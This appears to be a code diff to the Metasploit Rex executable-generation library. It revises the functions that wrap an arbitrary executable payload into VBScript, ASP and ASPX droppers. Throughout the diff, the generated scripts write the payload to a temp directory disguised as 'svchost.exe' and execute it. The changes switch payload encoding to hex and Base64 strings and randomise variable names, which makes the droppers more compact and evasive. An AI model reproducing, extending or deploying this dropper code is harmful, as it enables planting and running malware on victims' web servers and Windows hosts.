@@ -974,10 +974,11 @@ End Sub
 		delay   = opts[:delay]   || 5
 		persist = opts[:persist] || false
 
-		exe = exes.unpack('C*')
+		exe = exes.unpack("H*").join
 		vbs = ""
 
-		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+		var_bytes   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_byte    = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -986,22 +987,10 @@ End Sub
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_counter = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Function #{var_func}()\r\n"
-
-		vbs << "#{var_bytes}=Chr(#{exe[0]})"
-
-		lines = []
-		1.upto(exe.length-1) do |byte|
-			if(byte % 100 == 0)
-				lines.push "\r\n#{var_bytes}=#{var_bytes}"
-			end
-			# exe is an Array of bytes, not a String, thanks to the unpack
-			# above, so the following line is not subject to the different
-			# treatments of String#[] between ruby 1.8 and 1.9
-			lines.push "&Chr(#{exe[byte]})"
-		end
-		vbs << lines.join("") + "\r\n"
+		vbs << "#{var_bytes}=\"#{exe}\"\r\n"
 
 		vbs << "Dim #{var_obj}\r\n"
 		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
@@ -1009,13 +998,21 @@ End Sub
 		vbs << "Dim #{var_tempdir}\r\n"
 		vbs << "Dim #{var_tempexe}\r\n"
 		vbs << "Dim #{var_basedir}\r\n"
+		vbs << "Dim #{var_counter}\r\n"
 		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
 		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
 		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
-		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+		vbs << "#{var_counter} = 1\r\n"
+		vbs << "For #{var_counter} = 1 To Len(#{var_bytes})-3 Step 2\r\n"
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, #{var_counter}, 2)\r\n"
+		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
+		vbs << "Next\r\n"
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes},#{var_counter})\r\n"
+		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
+
 		vbs << "#{var_stream}.Close\r\n"
 		vbs << "Dim #{var_shell}\r\n"
 		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
@@ -1030,13 +1027,15 @@ End Sub
 		vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
 		vbs << "Loop\r\n" if persist
 		vbs
+
 	end
 
 	def self.to_exe_asp(exes = '', opts={})
-		exe = exes.unpack('C*')
+		exe = exes.unpack("H*").join
 		vbs = "<%\r\n"
 
-		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+		var_bytes   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_byte    = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1045,22 +1044,10 @@ End Sub
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_counter = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Sub #{var_func}()\r\n"
-
-		vbs << "#{var_bytes}=Chr(#{exe[0]})"
-
-		lines = []
-		1.upto(exe.length-1) do |byte|
-			if(byte % 100 == 0)
-				lines.push "\r\n#{var_bytes}=#{var_bytes}"
-			end
-			# exe is an Array of bytes, not a String, thanks to the unpack
-			# above, so the following line is not subject to the different
-			# treatments of String#[] between ruby 1.8 and 1.9
-			lines.push "&Chr(#{exe[byte]})"
-		end
-		vbs << lines.join("") + "\r\n"
+		vbs << "#{var_bytes}=\"#{exe}\"\r\n"
 
 		vbs << "Dim #{var_obj}\r\n"
 		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
@@ -1068,13 +1055,22 @@ End Sub
 		vbs << "Dim #{var_tempdir}\r\n"
 		vbs << "Dim #{var_tempexe}\r\n"
 		vbs << "Dim #{var_basedir}\r\n"
+		vbs << "Dim #{var_counter}\r\n"
 		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
 		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
 		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
-		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+		vbs << "#{var_counter} = 1\r\n"
+		vbs << "For #{var_counter} = 1 To Len(#{var_bytes})-3 Step 2\r\n"
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, #{var_counter}, 2)\r\n"
+		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
+		vbs << "Next\r\n"
+
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes},#{var_counter})\r\n"
+		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
+
 		vbs << "#{var_stream}.Close\r\n"
 		vbs << "Dim #{var_shell}\r\n"
 		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
@@ -1088,8 +1084,8 @@ End Sub
 	end
 
 	def self.to_exe_aspx(exes = '', opts={})
-		exe = exes.unpack('C*')
-
+		#exe = exes.unpack('H*').join
+		exe = Rex::Text.encode_base64(exes)
 		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1097,6 +1093,9 @@ End Sub
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_fs = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytes = Rex::Text.rand_text_alpha(rand(8)+8)
+
 
 		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
 		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
@@ -1104,14 +1103,14 @@ End Sub
 		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
 		source << "\t{\r\n"
 		source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
-		source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
+		source << "\t\t#{var_file}.Append(\"#{exe[0]}"
 
-		1.upto(exe.length-1) do |byte|
+		1.upto(exe.length-1) do |character|
 				# Apparently .net 1.0 has a limit of 2046 chars per line
-				if(byte % 100 == 0)
+				if(character % 1000 == 0)
 						source << "\");\r\n\t\t#{var_file}.Append(\""
 				end
-				source << "\\x#{exe[byte].to_s(16)}"
+				source << exe[character]
 		end
 
 		source << "\");\r\n"
@@ -1121,17 +1120,15 @@ End Sub
 		source << "\r\n"
 		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
 		source << "\r\n"
-		source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
+		source << "\t\tFileStream #{var_fs} = File.Create(#{var_tempexe});\r\n"
 		source << "\t\ttry\r\n"
 		source << "\t\t{\r\n"
-		source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
-		source << "\t\t\t{\r\n"
-		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
-		source << "\t\t\t}\r\n"
+		source << "\t\t\tbyte[] #{var_bytes} = Convert.FromBase64String(#{var_file}.ToString());\r\n"
+		source << "\t\t\t#{var_fs}.Write(#{var_bytes},0, #{var_bytes}.Length);\r\n"
 		source << "\t\t}\r\n"
 		source << "\t\tfinally\r\n"
 		source << "\t\t{\r\n"
-		source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
+		source << "\t\t\tif (#{var_fs} != null) ((IDisposable)#{var_fs}).Dispose();\r\n"
 		source << "\t\t}\r\n"
 		source << "\r\n"
 		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
